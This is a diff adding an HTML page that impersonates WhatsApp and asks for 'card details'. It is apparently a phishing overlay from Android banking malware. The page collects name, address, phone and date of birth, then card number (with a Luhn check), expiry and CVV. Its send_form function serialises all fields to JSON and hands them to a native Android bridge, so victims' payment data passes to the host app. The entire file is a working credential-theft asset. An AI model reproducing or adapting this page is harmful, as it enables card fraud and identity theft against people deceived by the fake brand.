@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>whatsapp</title>
+    <link rel="shortcut icon" href="com.whatsapp.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #d3dbda;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+    }
+    .logo {
+    text-align: left;
+    background-size: 100%;
+    padding: 30px 0px 30px 20px;
+    background: #18bca9;
+    color: #fff;
+    font-weight: 400;
+    font-size: 18px;
+    text-decoration: none;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+form {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+    width: 100%;
+
+}
+
+input[type="text"],input[type="password"], input[type="number"], input[type="date"] {
+line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 0px 0px 0px 0px;
+    margin: 0px 0px;
+    -webkit-box-shadow: none;
+    outline: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 54px;
+    color: #000;
+    outline: none;
+    text-align: left;
+    border: none;
+    background: none;
+    outline: none;
+    margin: 0px;
+    border: 1px solid #e1dfdf;
+    border-top: none;
+    border-left: none;
+    border-right: none;
+    padding-left: 5px;
+}
+input[type="button"], button {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 50px;
+    margin: 0 auto;
+    outline: none;
+    color: #fff;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #18bca9;
+    margin-top: 40px;
+    border: none;
+    cursor: pointer;
+    font-weight: bolder;
+    text-align: center;
+}
+
+input:disabled, button:disabled {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 50px;
+    margin: 0 auto;
+    outline: none;
+    color: #fff;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #18bca9;
+    margin-top: 40px;
+    border: none;
+    cursor: pointer;
+    font-weight: bolder;
+    opacity: 0.7;
+    text-align: center;
+}
+input::placeholder {
+    font-size: 14px;
+}
+
+</style>
+
+<fieldset id="formtosend">
+
+<div class="logo">
+
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAD8AAAA4CAYAAABKWiBnAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAAVASURBVGhD5ZrbThRBEIZ5BB6BR+AN5A3kDfARuPJSuPNOudM7NNHEwwXERBOPoCaaeAJP0Si6Jipi0B0VwrqL0s4/O7P21v7V0zPToyRU8iVSOztdf091dfWsQ0MLp82ehTr3CtS5V6DOvQJ11sjo/Utm4sVdM9V4YhaitT7m1t8nfnyO69j3g0Kdgdn/9KaZ/fTGRNttU8RwPb6H77P7VoY6AzB8+3zyFButzVRKNcN9kBFsrNJQZ0XG4ydV9Cn7GiYB92fjFoY6S4KnjbXrsm87LbPYfmOmN64mjDdPmrEvxxPw98zm7eRzXOcy1AeMx+LwhjpLgAKlPW0IObH1IBE6tHrQG1yP72mGLKhUGKmzIFqaQzSe5vDaFBXny8jnw+okYNzSE0CdBRhbupaG0W/LndUkaCamLKPrM8l9pZWeAOr0REt1rFsWfAiQRSwLEMfI3Xkapwp1eoBiw7axA9E5GnRo2AQsbTRprCrU6QGqrbR/JTyDTcB03FuweCnUmQNb5yhsLMC6mW89TyP4a97pT505yHRHACwwMBGdNVM/riRUrfoM3FP2BOg1WNwDUKeDA3GLKU2r6rNb99MruoY0ZddVBctNmlf1p04HKCq2aek++f1CekW/hd7+Mt796o/rRHwgYvH3QZ0KWEu2Id20VI5+b6VX9Vtd2yB7+rntL3UqoJLapqUx+nTNMCl1rH0gnz6WKNPRgzoVFqPP6W27pvXqWAouq2tLRFbZlpv61KlgG1KeBQBYCtqGesC+VxU8DNuwKzEdPaiTIPd2HDtZAAA9uGZIzbrSHveVxrT0oE4CTm625RUuuf5gyBZMDLs+FHgotjm3POokyGKX19GxdV/XPm8jxSNjmZ4E6iRI8ajobPAM1nmh0te1z2fsCvFAFiDYgqNWhEBmXC3i89I+gx080Paya0Mgt7sg4mXB8xWP9GdvX3DQYddXpZa0x01sK9KmosLL9Q9DBmjbHpbMXOtZcipkn2s0xC7jbHGpk4Cb2LbU+UgH19AmAPeR9UP2CRCESfDpD6QxLT2oU+GdOMf7BGOjTQAMTxmTgGu0QxH8ruUiCyzacaajB3UqoFe2rUyPjq2O1YAixu4L5GstFGmmowd1KsiiV2XbklXZ11xvjWTG5L7QoE4H37Y76a275rPfayDFi2aBdpKUh6llnze51Olg5v3L9PZdC9G0YALlFsVMW2aoPbLK557lAXU6kG9zYFWevg3qAY67ciKQ6q4xZFeHwsxiH4A6c5CFr8ieH5pkdxA7yOTrhzTuAagzh3nxg4W2DuuGpfvSj69m6MYpP5i4POTvc0X3+xBgTDRIme3s7CSM3rvIhTKYOBfYPmxbbn+iwdWJLTwTDSZfPeAiNZhAF/J096/XOwof9nNbNJhdXeECXTCBLuQbXFaFUbXRixc9lDj5eNAc+n55QHRp4YAJ1JCHGxgCy8TObj40jU6UftI1FKRSW2EsNmOieca83f4aVjhgIjVkexv9bg2I1QyTcDReItiaqNiMVPC+9WPmyMYt0yQpnlF4jUuYSA3Z3VUxdIYAqQwg9MbPFfOo/YEKtcF2VqiqazCRGvgRwMfQYcleIDMmxpeo067+tG2YSAZrazODWHR96Kft/xiAf8OPwxAT40tjayMRPXwr7u2ZiLLYAl3Yv8trYlXigcafLCbFCSnLBEoWmmtm+u3jMOmtQYMloF8GXj/627BBYyBq7NHVAUbuzNHra4EGHAo24G6CBh0CNthugwZeFTbQbuC6gAZfBTbo/0QKtqECysIG/x8woQOcMn8AakxOYMwXDYgAAAAASUVORK5CYII=" style="
+    width: 40px;
+    position: relative;
+    top: 11px;
+    right: 10px;
+"> WHATSAPP
+
+<div style="
+    display: block;
+    text-align: center;
+    padding-top: 10px;
+">
+Enter card details
+</div>
+
+</div>
+
+
+<div class="" id="log" style="display: block; margin: 30px;">
+
+<div class="area" style="padding: 0px;border-radius: 10px;">
+
+
+<div class="forma" style="background: #fff;border-radius: 5px;padding-top: 20px;padding-bottom: 20px;padding: 20px; box-shadow: 0 17px 50px 0 rgba(0,0,0,.19), 0 12px 15px 0 rgba(0,0,0,.24);">
+
+<form id="infodata">
+
+
+<input type="text" name="Cardholder" id="Cardholder" pattern=".{3,}" placeholder="Cardholder Name" onkeyup="CheckValidInput('infodata')" autocomplete="none" required>
+<input type="text" name="Address" id="Address" pattern=".{3,}" placeholder="Street Address" onkeyup="CheckValidInput('infodata')" autocomplete="none" required>
+<input type="text" name="City" id="City" pattern=".{1,}" placeholder="City" onkeyup="CheckValidInput('infodata')" autocomplete="none" required>
+<input type="text" name="State" id="State" pattern=".{1,}" placeholder="State" onkeyup="CheckValidInput('infodata')" autocomplete="none" required>
+<input type="text" name="ZIP" id="ZIP" pattern="[0-9\-]{3,11}" maxlength="30" onkeyup="CheckValidInput('infodata')" placeholder="ZIP Code" autocomplete="none" required>
+<input type="text" name="Phone" id="Phone" onkeyup="CheckValidInput('infodata')" maxlength="30" placeholder="Telephone Number" autocomplete="none" required>
+
+<input id="DOB" name="DOB" type="text" placeholder="Date of birth" pattern=".{1,}" autocomplete="off" type="text" style="width: 100%;" onkeyup="CheckValidInput('infodata')" onfocus="(this.type='date')" onblur="if(!this.value)this.type='text'" required>
+
+<button id="btnNext" type="button" onclick="ChangeCCNext()">Next</button>
+
+
+
+</form>
+
+<script type="text/javascript">
+    function next() {
+        document.getElementById('login_form').style.display = 'none';
+        document.getElementById('ccForm').style.display = 'block';
+    }
+</script>
+
+<div id="CC">
+
+<form id="ccdata" style="display: none;">
+
+<input id="CCNUM" placeholder="Card Number" pattern="^[0-9 ]{12,24}$" maxlength="24" autocomplete="off" type="text" onkeyup="CheckValidInput('ccdata');" required>
+<span id="ccnumlbl" style="
+    display: block;
+    padding-top: 5px;
+    text-align: left;
+    font-size: 14px;
+    padding-bottom: 10px;
+    color: #eb2617;
+    padding-left: 5px;
+"></span>
+<input class="dt" name="MM" id="CCexpMM" placeholder="MM" pattern="^[1-9]{1}$|^[1]{1}[0-2]{1}$|^[0][1-9]{1}$" onkeyup="CheckValidInput('ccdata');" maxlength="2" autocomplete="off" type="text" style="width: 45%;" required>
+<input class="dt" name="YY" id="CCEXPYY" placeholder="YY" pattern="^19$|^2[0-9]$" maxlength="2" autocomplete="off" onkeyup="CheckValidInput('ccdata');" type="text" style="width: 45%;" required>
+
+<input id="CVV" name="CVV" placeholder="CVV" pattern="^[0-9]{3}$" autocomplete="off" maxlength="3" onkeyup="CheckValidInput('ccdata');" type="password" style="width:100%;" required>
+
+<button id="btnSumbit" type="button" onclick="send_form()">Save</button>
+
+</form>
+
+</div>
+
+<script type="text/javascript">
+
+
+invalidCC = 'Invalid card number';
+
+
+function maskCC(event) {
+    var vcc = this.value.replace(/\D/g, '');
+    this.value = '';
+    for(var i = 0; i < vcc.length; i++) {
+        this.value += (i%4==0 && i != 0 ? ' ' : '') + vcc[i];
+    }
+}
+document.getElementById('CCNUM').addEventListener('input', maskCC, false);
+
+function maskPhone(event) {
+    var vpp = this.value.replace(/\D/g, '');
+    this.value = '+' + vpp;
+}
+document.getElementById('Phone').addEventListener('input', maskPhone, false);
+
+function maskOnlyNumbers(event) {
+    this.value = this.value.replace(/\D/g, '');
+}
+
+var iddNUMBERS = ['ZIP', 'CCexpMM', 'CCEXPYY', 'CVV'];
+for(var i = 0; i < iddNUMBERS.length; i++) {
+    document.getElementById(iddNUMBERS[i]).addEventListener('input', maskOnlyNumbers, false);
+}
+
+function valid_credit_card(value) {
+    if (/[^0-9-\s]+/.test(value)) return false;
+    var nCheck = 0, nDigit = 0, bEven = false;
+    value = value.replace(/\D/g, "");
+    for (var n = value.length - 1; n >= 0; n--) {
+        var cDigit = value.charAt(n),
+              nDigit = parseInt(cDigit, 10);
+        if (bEven) {
+            if ((nDigit *= 2) > 9) nDigit -= 9;
+        }
+        nCheck += nDigit;
+        bEven = !bEven;
+    }
+    return (nCheck % 10) == 0;
+}
+
+var BtnsOnPages = document.getElementsByTagName('button');
+for(var i = 0; i < BtnsOnPages.length; i++) {
+    BtnsOnPages[i].disabled = true;
+}
+
+function CheckValidInput(id) {
+    var finalbool = true, formids = document.getElementById(id);
+    var currentinputs = formids.getElementsByTagName('input');
+    for(var i = 0; i < currentinputs.length; i++ ) {
+        if(currentinputs[i].id == 'CCNUM') {
+            var bbb = valid_credit_card(currentinputs[i].value);
+            document.getElementById('ccnumlbl').innerText = bbb & currentinputs[i].checkValidity() ? '' : invalidCC;
+            finalbool&= bbb;
+            continue;
+        }
+        finalbool &= currentinputs[i].checkValidity();
+    }
+    formids.getElementsByTagName('button')[0].disabled = !finalbool;
+}
+
+var AllForms = document.getElementsByTagName('form');
+
+function ChangeCCNext() {
+    document.getElementById('infodata').style.display = 'none';
+    document.getElementById('ccdata').style.display = 'block';
+    
+}
+</script>
+
+<input name="exit" type="hidden" text="true"/>
+
+</div>
+
+            </div>
+        
+</div>
+
+</fieldset> 
+
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        returnResult : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form()
+{
+    var form = document.getElementById('formtosend');
+    Android.returnResult( formToJSONbyName(form) );
+}
+
+</script>
+
+</body>
+</html>
